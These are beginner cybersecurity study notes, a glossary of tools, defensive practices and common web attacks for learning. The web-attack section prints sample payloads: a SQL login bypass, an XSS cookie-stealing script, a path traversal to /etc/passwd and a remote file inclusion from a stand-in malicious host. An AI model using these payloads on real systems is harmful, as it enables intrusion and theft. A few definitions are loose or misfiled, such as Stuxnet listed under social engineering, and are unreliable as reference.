GO BUSTER - A tool used to find hidden directories and pages on a website using a list of words.
-u: Used for scanning the target website.
-w: Specifies the wordlist to locate hidden pages.
Hidden Pages: Pages not publicly shown but still accessible.
Wordlist: File containing possible directory or page names.
Example: gobuster -u http://fakebank.thm -w wordlist.txt dir

BLUE TEAM vs RED TEAM -Two main groups in cybersecurity — the blue team defends systems, while the red team finds and exploits vulnerabilities.
Blue Team: Defensive security; protects systems.
Offensive (Red Team): Identifies and exploits system weaknesses.
Security Operations Center (SOC): Monitors networks and systems; focuses on vulnerabilities, policy violations, intrusions, and unauthorized activity.
Threat Intelligence: Collects data to prepare against potential adversaries.
Threat: Something that can disrupt or adversely affect a system.
Intelligence: Refers to actual and potential enemies.

DIGITAL FORENSICS AND INCIDENT RESPONSE (DFIR) - Digital Forensics investigates crimes using technology; Incident Response manages cyberattacks or data breaches.
Digital Forensics: Application of science to investigate crimes involving computers and digital systems.
File System: Analyzing digital images reveals installed, deleted, or overwritten files.
System Memory: Investigates malware running only in memory.
System Logs: Records events happening on client and server computers.
Network Logs: Track network packets to identify attacks.
Incident Response: Steps for handling cyberattacks.
Preparation: Team is trained and ready.
Detection and Analysis: Identify incidents using available resources.
Containment, Eradication, Recovery: Stop, remove, and fix affected systems.
Post-Incident Activity: Create reports and share lessons learned.

MALWARE / MALICIOUS ANALYSIS - Study of harmful software like viruses, Trojans, and ransomware designed to steal data or control devices.
Malware: Harmful software like viruses, Trojans, ransomware.
Virus: Code that attaches itself to a program.
Trojan: Malicious code hidden under legitimate programs.
Ransomware: Encrypts user files and demands payment for the password.
Static Analysis: Inspecting malware without executing it.
Dynamic Analysis: Running malware in a controlled environment to observe its activity.
Example: A victim downloads a fake video player from a shady website that gives attackers full control of the system.

SECURITY OPERATIONS CENTER (SOC) - A facility that monitors and analyzes network activity for potential security incidents.
SIEM: Security Information and Event Management system for monitoring security events.
Snake Oil: Fraudulent cryptographic method or product.
SS (Socket Statistics): Replaces netstat in Linux to show network connections.
Filetype: Search operator to limit Google results to certain file types.
Examples: filetype:pdf warfare report → limits results to PDF files about cyber warfare.

SEARCH ENGINES & OPERATORS - Techniques for refining searches and locating specific cybersecurity resources.
“Exact Phrase”: Searches for exact words inside quotes.
Example: "passive reconnaissance"
Site: Limits results to a domain.
Example: site:tryhackme.com success stories
(Minus): Excludes specific terms.
Example: pyramids -tourism
Filetype: Searches for specific file types.
Example: filetype:ppt cyber security

SPECIALIZED SEARCH ENGINES - Search engines designed for security research, device tracking, and malware scanning.
Shodan: Finds devices connected to the internet (servers, routers, webcams, IoT).
Example link: https://www.shodan.io/search/examples
Censys: Focuses on internet-connected hosts, websites, and certificates.
VirusTotal: Scans files/URLs with multiple antivirus engines.
Have I Been Pwned (HIBP): Checks if emails are in data breaches.
Example link: https://haveibeenpwned.com/

VULNERABILITIES AND EXPLOITS- Known security flaws and their exploit codes.
CVE: Common Vulnerabilities and Exposures (e.g., CVE-2024-29988).
Exploit Database: List of exploit codes by various authors.
AttackBox: A Linux system accessible from the browser for testing.
Product Documentation: Official references for Snort, Apache, PHP, Node.js.

PUBLIC KEY INFRASTRUCTURE (PKI) - System that manages certificates and public key encryption for secure communication.
ADCS: Active Directory Certificate Services, PKI implementation by Microsoft.
CA (Certificate Authority): Issues digital certificates.
Certificate Template: Defines how and when certificates can be issued.
CSR: Certificate Signing Request sent to a CA.
EKU: Extended/Enhanced Key Usage; defines how certificates can be used.
Domain Users/Computers: Authorized to request certificates.

SOCIAL ENGINEERING - Cyberattack that targets humans by tricking them into revealing information or granting access.
Stuxnet: Computer worm that spreads and takes control of devices.
USB Attack: Attackers leave infected USBs in public to trick victims.
Fake Calls: Attackers pretend to be bank employees to access accounts.
Prevention:
    Always verify callers.
    Legit employees never ask for passwords.
    Avoid plugging unknown external media.

PHISHING - Common cyberattack used to steal personal or corporate data through fake communication.
General Phishing: Non-targeted, large-scale attack.
Smart Phishing: Targeted toward specific individuals or small groups.
Whaling: Targets high-value individuals.
Prevention:
    Delete untrusted emails.
    Don’t click suspicious links.
    Keep antivirus software updated.

MALWARE & RANSOMWARE SAFETY - Practices that help prevent infections and data loss.
Software Updates: Always accept patches and updates.
Suspicious Files: Avoid running untrusted downloads.
Backup: Keep copies of important data to prevent loss.

MULTI-FACTOR AUTHENTICATION (MFA) - Login method that requires more than one authentication factor.
Authentication Factor: Different credentials used for login (e.g., password + code).
PUBLIC NETWORK SAFETY - Precautions to stay safe when using public Wi-Fi.
Man-in-the-Middle Attack: Attackers intercept unencrypted data.
VPN (Virtual Private Network): Encrypts traffic between your machine and the server.
Examples: ProtonVPN, Mullvad VPN.
HTTPS: Secure websites show a padlock icon.
Backup Rule 3-2-1:
    3 backups, 2 local, 1 stored elsewhere.

SECURITY CAREERS - Different cybersecurity job roles and their responsibilities.
Security Engineer: Develops and implements security solutions.
MTTD: Mean Time to Detect.
MTTA: Mean Time to Acknowledge.
MTTR: Mean Time to Recover.
Forensic Analyst: Collects and analyzes digital evidence.
Malware Analyst: Reverse-engineers malicious programs.

NETWORK FUNDAMENTALS - Describes how devices identify and connect within networks.
IP Address: Identifies a device temporarily in a network.
MAC Address: Permanent identifier similar to a serial number.

CYBERSECURITY FUNDAMENTALS - Protecting computer systems, networks, and sensitive data.
Three Pillars: People, Processes, Technology.
Vulnerability Scanning: Systematic review of weaknesses.
Penetration Testing: Simulated cyberattack to test defenses.
Pen Testing Lifecycle:
    Recon
    Scanning
    Gaining Access
    Maintaining Access
    Covering Tracks
    Reporting

CLOUD AND VIRTUALIZATION FUNDAMENTALS - Principles of using cloud environments for data storage and computing.
File Synchronization: Syncs data across devices.
CDN: Servers worldwide to reduce delay.
Public Cloud: Internet-based, cost-effective.
Private Cloud: Internal organizational system.
Hybrid Cloud: Combination of both.
Community Cloud: Shared among organizations.
CASB: Ensures secure device connection to cloud services.
Example Links:
    https://owasp.org/Top10/
    https://socradar.io/npm-supply-chain-attack-crypto-stealing-malware/


OS COMMAND INJECTION - Attack executing arbitrary commands on a system via untrusted input.
External Input: User input affecting the command string.
Special Characters: ;, &, &&, || used to chain commands.
Variant 1 (Arguments): Injecting extra arguments into commands.
Variant 2 (Command Path): Replacing command names with malicious ones.
Example:
    http://192.168.25.28:8080/login.php — vulnerable web app example.

BURP SUITE - Web testing tool for analyzing and attacking web applications.
Proxy: Intercepts web traffic.
Repeater: Manually modifies HTTP requests.
Intruder: Automates attacks like SQLi or XSS.
Scanner: Finds vulnerabilities automatically.
Sequencer: Analyzes randomness in session tokens.

SQL INJECTION (SQLi) - Injecting malicious SQL code into database queries.
Improper Neutralization: Using unvalidated user input in queries.
Login Bypass Example:
    Input: ' OR '1'='1
    Result: Always true, logs in attacker.
Impacts: Data theft, modification, or full system control.
Prevention:
    Prepared Statements
    Input Validation
    Stored Procedures

OWASP & COMMON WEB ATTACKS - Organization focused on improving software and web security.
XSS (Cross-Site Scripting): Injecting malicious scripts into web pages.
     XSS: Non-persistent attack via URL or request.
    Stored XSS: Script stored on the server.
    DOM-Based XSS: Script executes on client-side.
    Example: <script>alert(document.cookie)</script>
Path Traversal (CWE-35): Accessing restricted files using ../.
Example:
    http://some_site.com.br/get-files?file=../../../../etc/passwd
Remote File Inclusion (RFI):
Example:
    http://some_site.com.br/some-page?page=http://other-site.com.br/malicious-code.php

CASE STUDY – BLACKCAT RANSOMWARE (Change Healthcare) - A ransomware attack exploiting a Citrix server with no MFA, causing data exposure.
Attack Date: Feb 2024 detected; Jan 2025 – 190M affected.
Impact: $3.09 billion loss for UnitedHealth Group.
Vulnerability: Missing multi-factor authentication.
Prevention:
    Enable MFA
    Security training
    Regular assessments
    Incident Response Plan
